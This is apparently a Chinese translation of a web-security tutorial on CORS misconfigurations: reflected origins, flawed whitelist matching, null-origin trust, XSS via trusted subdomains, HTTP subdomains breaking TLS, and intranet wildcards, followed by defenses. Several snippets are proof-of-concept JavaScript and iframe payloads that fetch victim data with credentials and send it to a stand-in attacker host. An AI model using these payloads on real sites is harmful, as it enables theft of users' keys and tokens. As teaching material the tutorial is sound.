# 跨域资源共享（CORS）

在本节中，我们将解释什么是跨域资源共享（CORS），描述一些基于跨域资源共享的常见攻击示例，并讨论如何防御这些攻击。本主题是与 PortSwigger Research 合作编写的，该机构通过演讲 [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) 推广了此类攻击。

## 什么是 CORS（跨域资源共享）？

跨域资源共享（CORS）是一种浏览器机制，用于实现对位于给定域范围之外的资源的受控访问。它扩展并增加了同源策略（SOP）的灵活性。然而，如果网站的 CORS 策略配置和实施不当，它也为跨域攻击提供了可能性。CORS 并不是针对跨源攻击（如跨站请求伪造（CSRF））的保护措施。

## 同源策略

同源策略是一种严格的跨源规范，限制了网站与源域之外的资源进行交互的能力。同源策略是在多年前为应对潜在的恶意跨域交互（例如一个网站窃取另一个网站的私有数据）而定义的。它通常允许一个域向其他域发出请求，但不能访问响应。

## 同源策略的放宽

同源策略非常严格，因此已经设计了各种方法来规避其限制。许多网站与子域或第三方站点的交互方式需要完全的跨域访问。使用跨域资源共享（CORS）可以实现同源策略的受控放宽。

跨域资源共享协议使用一组 HTTP 头，这些头定义了可信的 Web 源以及相关属性，例如是否允许经过身份验证的访问。这些头在浏览器和其试图访问的跨域网站之间进行头交换组合。

## 由 CORS 配置问题引起的漏洞

许多现代网站使用 CORS 来允许来自子域和受信任第三方的访问。它们对 CORS 的实现可能包含错误，或者过于宽松以确保一切正常工作，这可能导致可利用的漏洞。

### 从客户端指定的 Origin 头生成服务器 ACAO 头

某些应用程序需要向多个其他域提供访问权限。维护允许域列表需要持续的努力，任何错误都可能破坏功能。因此，一些应用程序采取简单的方式，实际上允许来自任何其他域的访问。

一种方法是从请求中读取 `Origin` 头，并包含一个响应头，声明请求来源是被允许的。例如，考虑一个收到以下请求的应用程序：

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

然后它响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

这些头声明允许来自请求域（`malicious-website.com`）的访问，并且跨域请求可以包含 Cookie（`Access-Control-Allow-Credentials: true`），因此将在会话中进行处理。

由于应用程序在 `Access-Control-Allow-Origin` 头中反映了任意来源，这意味着任何域都可以访问易受攻击域的资​​源。如果响应包含任何敏感信息，例如 API 密钥或 CSRF 令牌，你可以通过在你的网站上放置以下脚本来检索这些信息：

```javascript
// XHR
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

```js
// fetch
fetch('https://vulnerable-website.com/sensitive-victim-data', {
    credentials: 'include'
})
.then(response => response.text())
.then(text => {
    fetch('https://malicious-website.com/log?key=' + text)
})
```

### 解析 Origin 头时的错误

一些支持来自多个来源访问的应用程序通过使用允许来源白名单来实现。当收到 CORS 请求时，提供的来源将与白名单进行比较。如果该来源出现在白名单上，则将其反射在 `Access-Control-Allow-Origin` 头中，从而授予访问权限。例如，应用程序收到如下普通请求：

```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

应用程序根据其允许来源列表检查提供的来源，如果它在列表中，则按如下方式反射该来源：

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

在实现 CORS 来源白名单时经常会出现错误。一些组织决定允许来自其所有子域（包括尚不存在的未来子域）的访问。一些应用程序允许来自各种其他组织域（包括其子域）的访问。这些规则通常通过匹配 URL 前缀或后缀，或使用正则表达式来实现。实现中的任何错误都可能导致无意中向意外的外部域授予访问权限。

例如，假设一个应用程序授予对所有以 `normal-website.com` 结尾的域的访问权限。攻击者可能会通过注册域名 `hackersnormal-website.com` 来获得访问权限。

或者，假设一个应用程序授予对所有以 `normal-website.com` 开头的域的访问权限。攻击者可能会使用域名 `normal-website.com.evil-user.net` 获得访问权限。

### 白名单中的 null 来源值

`Origin` 头的规范支持值 `null`。浏览器可能会在各种不常见的情况下在 `Origin` 头中发送值 `null`：

- 跨源重定向。
- 来自序列化数据的请求。
- 使用 `file:` 协议的请求。
- 沙盒跨源请求。

某些应用程序可能会将 `null` 来源列入白名单，以支持应用程序的本地开发。例如，假设一个应用程序收到以下跨域请求：

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

服务器响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

在这种情况下，攻击者可以使用各种技巧生成一个在 `Origin` 头中包含值 `null` 的跨域请求。这将满足白名单，从而导致跨域访问。例如，可以使用如下形式的沙盒 `iframe` 跨域请求：

```html
<!-- XHR -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','vulnerable-website.com/sensitive-victim-data',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            location='malicious-website.com/log?key='+this.responseText;
        };
    </script>">
</iframe>
```

```html
<!-- fetch -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        fetch('https://vulnerable-website.com/sensitive-victim-data', {
            credentials: 'include'
        })
        .then(response => response.text())
        .then(text => {
            fetch('https://malicious-website.com/log?key=' + text)
        })
    </script>">
</iframe>
```

### 通过 CORS 信任关系利用 XSS

即使是“正确”配置的 CORS 也会在两个来源之间建立信任关系。如果一个网站信任一个容易受到跨站脚本（XSS）攻击的来源，那么攻击者可以利用 XSS 注入一些 JavaScript，这些 JavaScript 使用 CORS 从信任该易受攻击应用程序的站点检索敏感信息。

给定以下请求：

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

如果服务器响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

那么，在 `subdomain.vulnerable-website.com` 上发现 XSS 漏洞的攻击者可以利用该漏洞检索 API 密钥，使用如下 URL：

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

### 利用配置不当的 CORS 破坏 TLS

假设一个严格使用 HTTPS 的应用程序也将一个使用纯 HTTP 的可信子域列入白名单。例如，当应用程序收到以下请求时：

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

应用程序响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

在这种情况下，能够拦截受害者用户流量的攻击者可以利用 CORS 配置来破坏受害者与应用程序的交互。此攻击涉及以下步骤：

1. 受害者用户发出任何纯 HTTP 请求。
2. 攻击者注入一个重定向到 `http://trusted-subdomain.vulnerable-website.com`。
3. 受害者的浏览器跟随重定向。
4. 攻击者拦截纯 HTTP 请求，并返回一个包含指向 `https://vulnerable-website.com` 的 CORS 请求的欺骗响应。
5. 受害者的浏览器发出 CORS 请求，包含来源 `http://trusted-subdomain.vulnerable-website.com`。
6. 应用程序允许该请求，因为这是一个白名单来源。请求的敏感数据在响应中返回。
7. 攻击者的欺骗页面可以读取敏感数据并将其传输到攻击者控制的任何域。

即使易受攻击的网站在使用 HTTPS 方面在其他方面都很健壮，没有 HTTP 端点并且所有 Cookie 都标记为安全，此攻击仍然有效。

> 注意，当脆弱白名单域为 http 时，需设置对应 URL 为匹配的 http。若设置 https 则被浏览器阻止。

### 内网和不带凭据的 CORS

大多数 CORS 攻击依赖于响应头的存在：`Access-Control-Allow-Credentials: true`

如果没有该头，受害者用户的浏览器将拒绝发送他们的 Cookie，这意味着攻击者只能访问未认证的内容，而他们可以直接浏览目标网站来轻松访问这些内容。

然而，有一种常见情况是攻击者无法直接访问网站：当它是组织内网的一部分，并且位于私有 IP 地址空间内时。内部网站的安全标准通常低于外部网站，使攻击者能够发现漏洞并获得进一步访问权限。例如，私有网络内的跨域请求可能如下：

```http
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

服务器响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

应用服务器接受来自任何来源的没有凭据的资源请求。如果私有 IP 地址空间内的用户访问公共互联网，则可以从外部站点执行基于 CORS 的攻击，该攻击使用受害者的浏览器作为访问内网资源的代理。

## 如何防止基于 CORS 的攻击

CORS 漏洞主要源于配置错误。因此，预防是一个配置问题。以下部分描述了针对 CORS 攻击的一些有效防御措施。

### 正确配置跨域请求

如果 Web 资源包含敏感信息，则应在 `Access-Control-Allow-Origin` 头中正确指定来源。

### 仅允许受信任的站点

这似乎很明显，但 `Access-Control-Allow-Origin` 头中指定的来源应仅为受信任的站点。特别是，未经验证就动态反射跨域请求中的来源是容易被利用的，应予以避免。

### 避免将 null 列入白名单

避免使用头 `Access-Control-Allow-Origin: null`。来自内部文档和沙盒请求的跨域资源调用可以指定 `null` 来源。应针对私有和公共服务器的可信来源正确定义 CORS 头。

### 避免在内网中使用通配符

避免在内网中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅依靠网络配置来保护内部资源是不够的。

### CORS 不能替代服务器端安全策略

CORS 定义了浏览器行为，绝不能替代服务器端对敏感数据的保护——攻击者可以直接从任何受信任来源伪造请求。因此，除了正确配置 CORS 之外，Web 服务器还应继续对敏感数据应用保护措施，例如身份验证和会话管理。
